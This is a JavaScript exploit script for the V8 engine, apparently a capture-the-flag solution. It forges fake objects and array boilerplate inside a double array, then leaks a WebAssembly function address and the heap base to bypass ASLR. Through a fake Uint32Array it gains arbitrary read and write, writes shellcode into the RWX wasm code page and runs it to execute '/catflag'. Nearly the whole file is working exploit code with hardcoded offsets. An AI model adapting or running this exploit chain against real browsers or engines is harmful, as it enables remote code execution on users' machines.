function dp(x) { %DebugPrint(x); }
const print = console.log;
const assert = function (b, msg) {
	if (!b)
		throw Error(msg);
};

const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);

function d2u(val) { //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
}

function u2d(val0, val1) { //Uint64 ==> double
	__dvCvt.setUint32(0, val0, true);
	__dvCvt.setUint32(4, val1, true);
	return __dvCvt.getFloat64(0, true);
}

const hex = (x) => ("0x" + x.toString(16));

function getWMain() {
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
const wmain = getWMain();

function foo() {
    const x = 0x2019; // signature for Python to find the bytecode of this function
    const arr = [{}, 0x1337];
    return arr[0];
}

function foo1() {
    const d = [
        /*
         * // find offsets
         * 2261634.5098039214,      // 0x4141414141414141
         * 156842099844.51764,      // 0x4242424242424242
         * 1.0843961455707782e+16,  // 0x4343434343434343
         */

        // release
        9.108283e-318,
        9.108283e-318,
        9.108283e-318

        /*
         * // debug
         * 1.169861e-317,
         * 1.169861e-317,
         * 1.169861e-317
         */
    ];
    return d[1];
}

let res;

const bigArray = Array(0x4000);
bigArray.fill(1.1);

// debug
// const offset = 0x00242151;

// release
const offset = 0x001c2151;

// [debug] 0x00242151 | [release] 0x001c2151 : fake-ArrayBoilerplateDescription
bigArray[0] = u2d(
    0x000033f5, 0x00000004
)
bigArray[1] = u2d(
    offset + 0x10, 0x00000000
)

// [debug] 0x00242161 | [release] 0x001c2161 : fake-FixedArray (constant elements)
bigArray[2] = u2d(
    0x00002239, 0x00000004
)
bigArray[3] = u2d(
    offset + 0x20, 0x00000000
)

// debug
// const fakeObjMap = 0x001c59b1;

// release
const fakeObjMap = 0x001459b1;

// [debug] 0x00242171 | [release] 0x001c2171 : fake object
bigArray[4] = u2d(
    fakeObjMap, 0x00002261
)
bigArray[5] = u2d(
    0x00002261, 0x00000000
)

// debug
// const doubleArrMap = 0x001c3b11;

// release
const doubleArrMap = 0x00143b11;

bigArray[6] = u2d(
    doubleArrMap, 0x00002261
)

const baseLeakArrOffset = 0x2140;

bigArray[7] = u2d(
    offset - baseLeakArrOffset, 0x00000002
)

// rest
bigArray[8] = u2d(0x4, 0x4)
bigArray[9] = u2d(0x4, 0x4)
bigArray[10] = u2d(0x4, 0x4)
bigArray[11] = u2d(0x4, 0x4)
bigArray[12] = u2d(0x4, 0x4)
bigArray[13] = u2d(0x4, 0x4)
bigArray[14] = u2d(0x4, 0x4)

res = foo1();

const obj = {a: wmain};
// dp(obj);

// get fake obj from fake-FixedArray
const fakeObj = foo();
// dp(fakeObj);
// dp(wmain);

fakeObj.a = wmain;

// leak wmain address
d2u(bigArray[5]);
const wmainAddr = __dvCvt.getUint32(4, true);
dp(hex(wmainAddr));

// overwrite wmain address with next fakeObj
bigArray[5] = u2d(0x00002261, offset + 0x30);

const arr = [1.1];
// dp(arr);

const faker = fakeObj.a;
// dp(faker);

// leak baseAddr (ASLR)
d2u(faker[0]);
const baseAddr = __dvCvt.getUint32(4, true);
dp(hex(baseAddr));

// fake Uint32Array map
// map(UINT32ELEMENTS), properties
bigArray[6] = u2d(
    0x001431b1, 0x00002261
);
// elements, buffer
bigArray[7] = u2d(
    0x000033e1, 0x00055895
);
bigArray[8] = 0;
bigArray[9] = u2d(
    0x00000104, 0x00000000
);
bigArray[10] = u2d(
    0x000023e8, 0x00000041
);
bigArray[11] = u2d(
    // 0, external_pointer second 4 bytes
    0x00000000, wmainAddr - 1 - 0x60
);
bigArray[12] = u2d(
    // external_pointer first 4 bytes, base_pointer
    baseAddr, 0x00000000
);
bigArray[13] = 0;
bigArray[14] = 0;

const rwxAddr0 = faker[0];
const rwxAddr1 = faker[1];

// update Uint32Array's external_pointer to point to rwxAddr
bigArray[11] = u2d(0x00000000, rwxAddr0);
bigArray[12] = u2d(rwxAddr1, 0x00000000);

// execute "/catflag"
const sc = [1664071752,1818653793,6973281,3884533840,1784086634,2303219771,265433574,2425393157,4276879083];

dp(faker);

for (let i = 0; i < sc.length; ++i) {
	faker[i] = sc[i];
}

wmain();
